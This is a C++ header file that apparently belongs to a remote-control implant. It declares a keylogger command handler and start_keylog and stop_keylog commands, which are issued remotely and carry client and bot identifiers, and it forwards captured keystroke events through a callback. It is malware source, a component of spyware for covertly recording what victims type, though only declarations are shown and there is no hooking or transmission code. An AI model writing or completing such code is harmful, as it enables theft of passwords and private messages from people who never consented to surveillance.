#pragma once
#include "core/ICommand.hpp"
#include "interfaces/IKeylogger.hpp"
#include <memory>
#include <functional>

namespace handlers {

// ============================================================================
// KeyloggerCommandHandler - Handles keylogger control commands
// ============================================================================
// Commands: start_keylog, stop_keylog
// ============================================================================

class KeyloggerCommandHandler final : public core::command::ICommandHandler {
public:
    // Callback for keylog events
    using KeyEventCallback = std::function<void(uint32_t cid, uint32_t bid, const interfaces::KeyEvent&)>;

    KeyloggerCommandHandler(
        std::shared_ptr<interfaces::IKeylogger> keylogger,
        KeyEventCallback event_callback
    )   : keylogger_(std::move(keylogger))
        , event_callback_(std::move(event_callback))
    {}

    bool can_handle(const std::string& cmd) const override {
        return cmd.find("keylog") != std::string::npos;
    }

    const char* category() const noexcept override { return "Keylogger"; }

    std::unique_ptr<core::command::ICommand> parse_command(
        const std::string& cmd,
        const std::string& args,
        const core::command::CommandContext& ctx
    ) override;

private:
    std::shared_ptr<interfaces::IKeylogger> keylogger_;
    KeyEventCallback event_callback_;
};

// ============================================================================
// Keylogger Commands
// ============================================================================

class StartKeylogCommand final : public core::command::ICommand {
public:
    StartKeylogCommand(
        std::shared_ptr<interfaces::IKeylogger> keylogger,
        std::function<void(const interfaces::KeyEvent&)> on_event,
        core::command::CommandContext ctx
    ) : keylogger_(std::move(keylogger))
      , on_event_(std::move(on_event))
      , ctx_(std::move(ctx)) {}

    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "start_keylog"; }

private:
    std::shared_ptr<interfaces::IKeylogger> keylogger_;
    std::function<void(const interfaces::KeyEvent&)> on_event_;
    core::command::CommandContext ctx_;
};

class StopKeylogCommand final : public core::command::ICommand {
public:
    StopKeylogCommand(
        std::shared_ptr<interfaces::IKeylogger> keylogger,
        core::command::CommandContext ctx
    ) : keylogger_(std::move(keylogger))
      , ctx_(std::move(ctx)) {}

    common::EmptyResult execute() override;
    const char* type() const noexcept override { return "stop_keylog"; }

private:
    std::shared_ptr<interfaces::IKeylogger> keylogger_;
    core::command::CommandContext ctx_;
};

} // namespace handlers
